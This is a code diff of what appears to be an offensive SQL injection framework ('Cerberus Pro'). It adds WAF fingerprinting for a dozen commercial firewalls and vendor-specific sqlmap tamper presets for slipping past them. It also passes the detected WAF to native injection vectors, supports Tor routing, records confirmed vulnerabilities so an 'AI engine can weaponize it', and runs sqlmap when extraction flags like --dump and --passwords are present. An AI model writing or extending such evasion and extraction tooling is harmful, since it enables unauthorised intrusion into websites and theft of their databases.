@@ -10,6 +10,7 @@ from datetime import datetime, timezone
 from typing import Callable, Dict, List, Optional, Tuple, Any
 from abc import ABC, abstractmethod
 from urllib.parse import parse_qs, urlparse
+from backend.core.smart_cache import get_shared_smart_cache
 
 
 UA_POOL = [
@@ -375,9 +376,16 @@ WAF_TAMPER_PRESETS = {
     "cloudflare": ["randomcase", "space2comment", "between", "charencode", "space2mysqldash"],
     "cloudflare_ml": ["apostrophemask", "equaltolike", "space2plus", "randomcomments", "versionedkeywords"],
     "akamai": ["charencode", "between", "space2comment", "greatest"],
-    "imperva": ["charencode", "between", "space2comment", "greatest"],
-    "aws": ["ifnull2ifisnull", "space2plus", "between", "randomcase"],
-    "f5": ["ifnull2ifisnull", "space2mssqlhash", "between", "randomcase"],
+    "imperva": ["charencode", "between", "space2comment", "greatest", "apostrophemask"],
+    "aws": ["ifnull2ifisnull", "space2plus", "between", "randomcase", "charencode"],
+    "f5": ["ifnull2ifisnull", "space2mssqlhash", "between", "randomcase", "apostrophemask"],
+    "sucuri": ["charencode", "space2comment", "randomcase", "between", "apostrophemask"],
+    "wordfence": ["randomcase", "charencode", "space2comment", "between", "apostrophemask"],
+    "barracuda": ["charencode", "space2plus", "randomcase", "between", "unionalltounion"],
+    "fortinet": ["space2comment", "charencode", "randomcase", "between", "apostrophemask"],
+    "citrix": ["space2comment", "charencode", "randomcase", "between", "greatest"],
+    "modsecurity": ["space2comment", "charencode", "randomcase", "between", "versionedmorekeywords"],
+    "ddos_guard": ["randomcase", "space2comment", "between", "charencode"],
     "general_strong": ["randomcase", "space2comment", "apostrophemask", "between", "charencode"]
 }
 
@@ -565,6 +573,14 @@ async def calibration_waf_detect(url: str) -> str:
         "akamai": 0,
         "imperva": 0,
         "aws": 0,
+        "f5": 0,
+        "sucuri": 0,
+        "wordfence": 0,
+        "barracuda": 0,
+        "fortinet": 0,
+        "citrix": 0,
+        "modsecurity": 0,
+        "ddos_guard": 0,
     }
     methods = ["GET", "HEAD", "GET", "HEAD", "GET"]
     sample_count = random.randint(3, 5)
@@ -583,22 +599,91 @@ async def calibration_waf_detect(url: str) -> str:
 
             raw_headers = {k.lower(): v.lower() for k, v in resp.headers.items()}
             body = (resp.text or "").lower()[:3000] if method == "GET" else ""
+            set_cookie = raw_headers.get("set-cookie", "")
 
+            # Cloudflare
             if "cf-ray" in raw_headers or "cloudflare" in raw_headers.get("server", ""):
                 hints["cloudflare"] += 2
-            if "ak_bmsc" in raw_headers.get("set-cookie", "") or "akamai" in raw_headers.get("server", ""):
-                hints["akamai"] += 2
-            if "incapsula" in raw_headers.get("x-cdn", "") or "imperva" in raw_headers.get("server", ""):
-                hints["imperva"] += 2
-            if "awselb" in raw_headers.get("server", "") or "x-amz-cf-id" in raw_headers:
-                hints["aws"] += 2
-
             if re.search(r"(attention required|checking your browser|cf-chl)", body):
                 hints["cloudflare"] += 1
+
+            # Akamai
+            if "ak_bmsc" in set_cookie or "akamai" in raw_headers.get("server", ""):
+                hints["akamai"] += 2
             if re.search(r"(akamai|ak_bmsc|bot manager)", body):
                 hints["akamai"] += 1
+
+            # Imperva / Incapsula
+            if "incapsula" in raw_headers.get("x-cdn", "") or "imperva" in raw_headers.get("server", ""):
+                hints["imperva"] += 2
+            if "visid_incap" in set_cookie or "incap_ses" in set_cookie:
+                hints["imperva"] += 2
             if re.search(r"(incapsula|imperva)", body):
                 hints["imperva"] += 1
+
+            # AWS WAF
+            if "awselb" in raw_headers.get("server", "") or "x-amz-cf-id" in raw_headers or "x-amzn-requestid" in raw_headers:
+                hints["aws"] += 2
+            if "awsalb" in set_cookie:
+                hints["aws"] += 1
+
+            # F5 BigIP ASM
+            if "bigip" in raw_headers.get("server", "") or "x-wa-info" in raw_headers:
+                hints["f5"] += 2
+            if "bigipserver" in set_cookie or "ts_" in set_cookie or "f5_cspm" in set_cookie:
+                hints["f5"] += 2
+            if re.search(r"(requested url was rejected|support id)", body):
+                hints["f5"] += 1
+
+            # Sucuri
+            if "sucuri" in raw_headers.get("server", "") or "x-sucuri-id" in raw_headers:
+                hints["sucuri"] += 2
+            if "sucuri_cloudproxy" in set_cookie:
+                hints["sucuri"] += 2
+            if re.search(r"(sucuri.*firewall|access denied.*sucuri)", body):
+                hints["sucuri"] += 1
+
+            # Wordfence
+            if "wfwaf-authcookie" in set_cookie:
+                hints["wordfence"] += 2
+            if re.search(r"(wordfence|wfwaf|generated by wordfence)", body):
+                hints["wordfence"] += 1
+
+            # Barracuda
+            if "barracuda" in raw_headers.get("server", ""):
+                hints["barracuda"] += 2
+            if "barra_counter_session" in set_cookie or "bni_" in set_cookie:
+                hints["barracuda"] += 2
+            if re.search(r"(barracuda|web application firewall)", body):
+                hints["barracuda"] += 1
+
+            # Fortinet / FortiWeb
+            if "fortiweb" in raw_headers.get("server", "") or "fortiwafsid" in raw_headers:
+                hints["fortinet"] += 2
+            if "fortiwafsid" in set_cookie:
+                hints["fortinet"] += 2
+            if re.search(r"(fortinet|fortiweb|fortigate)", body):
+                hints["fortinet"] += 1
+
+            # Citrix ADC / NetScaler
+            if "ns-cache" in raw_headers.get("via", "") or "cneonction" in raw_headers:
+                hints["citrix"] += 2
+            if "citrix_ns_id" in set_cookie or "ns_af" in set_cookie or "nsc_" in set_cookie:
+                hints["citrix"] += 2
+
+            # ModSecurity
+            if "mod_security" in raw_headers.get("server", ""):
+                hints["modsecurity"] += 2
+            if "mod_security" in set_cookie:
+                hints["modsecurity"] += 1
+            if re.search(r"(modsecurity|not acceptable.*rule id)", body):
+                hints["modsecurity"] += 1
+
+            # DDoS-Guard
+            if "ddos-guard" in raw_headers.get("server", ""):
+                hints["ddos_guard"] += 2
+            if re.search(r"ddos-guard", body):
+                hints["ddos_guard"] += 1
 
     best = max(hints, key=lambda k: hints[k])
     if hints[best] <= 0:
@@ -716,6 +801,7 @@ async def run_sqlmap_vector(
     vector_name: str,
     base_cmd: List[str],
     broadcast_log: Callable[[str, str, str, Dict[str, object]], asyncio.Future],
+    polymorphic: "PolymorphicEvasionEngine",
     timeout_sec: int = 180,
 ) -> OmniResult:
     cmd = list(base_cmd)
@@ -806,37 +892,54 @@ async def run_sqlmap_vector(
                 # Setup Native Client (with Ghost Network / TOR support if configured)
                 use_tor = os.environ.get("CERBERUS_USE_TOR") == "true"
                 async with CerberusHTTPClient(use_tor=use_tor, timeout=timeout_sec) as http_client:
+                    # Pass detected WAF to native vectors for AI Counter-Intelligence
+                    run_ctx = {"waf_type": getattr(polymorphic, "waf_type", "general_strong")}
+
                     v_res = None
                     if tech == "B":
                         await broadcast_log("CERBERUS_PRO", "INFO", f"[{vector_name}] Lanzando Vector Nativo: BOOLEAN (Differential)", {"vector": vector_name})
                         vector = VectorBoolean(http_client, target_url)
-                        v_res = await vector.run({})
+                        v_res = await vector.run(run_ctx)
                     elif tech == "T":
                         await broadcast_log("CERBERUS_PRO", "INFO", f"[{vector_name}] Lanzando Vector Nativo: TIME (Latency)", {"vector": vector_name})
                         vector = VectorTime(http_client, target_url)
-                        v_res = await vector.run({})
+                        v_res = await vector.run(run_ctx)
                     elif tech == "E":
                         await broadcast_log("CERBERUS_PRO", "INFO", f"[{vector_name}] Lanzando Vector Nativo: ERROR (Signatures)", {"vector": vector_name})
                         vector = VectorError(http_client, target_url)
-                        v_res = await vector.run({})
+                        v_res = await vector.run(run_ctx)
                     elif tech == "U":
                         await broadcast_log("CERBERUS_PRO", "INFO", f"[{vector_name}] Lanzando Vector Nativo: UNION (Heuristic)", {"vector": vector_name})
                         vector = VectorUnion(http_client, target_url)
-                        v_res = await vector.run({})
+                        v_res = await vector.run(run_ctx)
                     elif tech == "S":
                         await broadcast_log("CERBERUS_PRO", "INFO", f"[{vector_name}] Lanzando Vector Nativo: STACKED (Multi-Statement)", {"vector": vector_name})
                         vector = VectorStacked(http_client, target_url)
-                        v_res = await vector.run({})
+                        v_res = await vector.run(run_ctx)
                     elif tech == "Q":
                         await broadcast_log("CERBERUS_PRO", "INFO", f"[{vector_name}] Lanzando Vector Nativo: INLINE (Subquery)", {"vector": vector_name})
                         vector = VectorInline(http_client, target_url)
-                        v_res = await vector.run({})
+                        v_res = await vector.run(run_ctx)
 
-                    if v_res and v_res.get("status") == "vulnerable":
+                    if v_res and v_res.vulnerable:
                         vulnerable = True
                         evidence.append(f"[!!!] VULNERABILIDAD CONFIRMADA por Vector Nativo {vector_name}")
-                        evidence.append(str(v_res.get("evidence", "")))
+                        evidence.append(str(v_res.evidence))
                         await broadcast_log("CERBERUS_PRO", "SUCCESS", f"[!!!] {vector_name} VULNERABLE !!!", {"vector": vector_name})
+                        
+                        # ── Collective Intelligence (Phase 2) ──
+                        # Feed this success back to SmartCache so the AI engine can weaponize it
+                        try:
+                            shared_cache = get_shared_smart_cache()
+                            feedback_ctx = {
+                                "namespace": "native_success_v1",
+                                "target": target_url,
+                            }
+                            # We record the finding as a "strategy" that worked for this target
+                            await shared_cache.update_feedback(feedback_ctx, v_res, success=True)
+                        except Exception as e_cache:
+                            import logging
+                            logging.getLogger("cerberus.native_bridge").error(f"Error updating collective intelligence: {e_cache}")
 
                 await broadcast_log("CERBERUS_PRO", "INFO", f"[{vector_name}] finalizado (Nativo)", {"vector": vector_name})
                 return OmniResult(vector=vector_name, vulnerable=vulnerable, evidence=evidence, command=cmd, exit_code=0)
@@ -849,6 +952,13 @@ async def run_sqlmap_vector(
 
     async def _run_sync_fallback() -> OmniResult:
         nonlocal vulnerable
+        
+        # Skip sqlmap for discovery if the command doesn't contain extraction flags
+        is_extraction = any(flag in cmd for flag in ["--dump", "--dbs", "--tables", "--columns", "--current-user", "--current-db", "--passwords", "--schema", "--count"])
+        if not is_extraction and not skip_bridge:
+            await broadcast_log("CERBERUS_PRO", "INFO", f"[{vector_name}] Sqlmap omitido por optimización (Fase Descubrimiento - Fallback)", {"vector": vector_name})
+            return OmniResult(vector=vector_name, vulnerable=vulnerable, evidence=evidence, command=cmd, exit_code=0)
+
         await broadcast_log("CERBERUS_PRO", "WARN", f"[{vector_name}] iniciando subproceso nativo de escaneo...", {"vector": vector_name})
         try:
             popen_kwargs = {
@@ -1078,11 +1188,17 @@ async def run_sqlmap_vector(
         kwargs["start_new_session"] = True
         kwargs["preexec_fn"] = _set_limits
 
+    # Skip sqlmap for discovery if the command doesn't contain extraction flags
+    is_extraction = any(flag in cmd for flag in ["--dump", "--dbs", "--tables", "--columns", "--current-user", "--current-db", "--passwords", "--schema", "--count"])
+    if not is_extraction and not skip_bridge:
+        await broadcast_log("CERBERUS_PRO", "INFO", f"[{vector_name}] Sqlmap omitido por política de optimización en fase de descubrimiento.", {"vector": vector_name})
+        return OmniResult(vector=vector_name, vulnerable=vulnerable, evidence=evidence, command=cmd, exit_code=0)
+
     try:
         proc = await asyncio.create_subprocess_exec(*cmd, **kwargs)
     except NotImplementedError:
         return await _run_sync_fallback()
-    await broadcast_log("CERBERUS_PRO", "INFO", f"[{vector_name}] lanzado", {"vector": vector_name, "cmd": cmd})
+    await broadcast_log("CERBERUS_PRO", "INFO", f"[{vector_name}] lanzado (Sqlmap Extracción)", {"vector": vector_name, "cmd": cmd})
 
     try:
         saw_end_marker = False
@@ -1196,6 +1312,8 @@ def build_vector_commands(
         base.append(f"--risk={int(sql_config['risk'])}")
     if sql_config.get("threads"):
         base.append(f"--threads={int(sql_config['threads'])}")
+    if sql_config.get("timeout"):
+        base.append(f"--timeout={int(sql_config['timeout'])}")
     
     # Advanced: Extra Data / Chaining
     # Advanced: Extra Data / Chaining
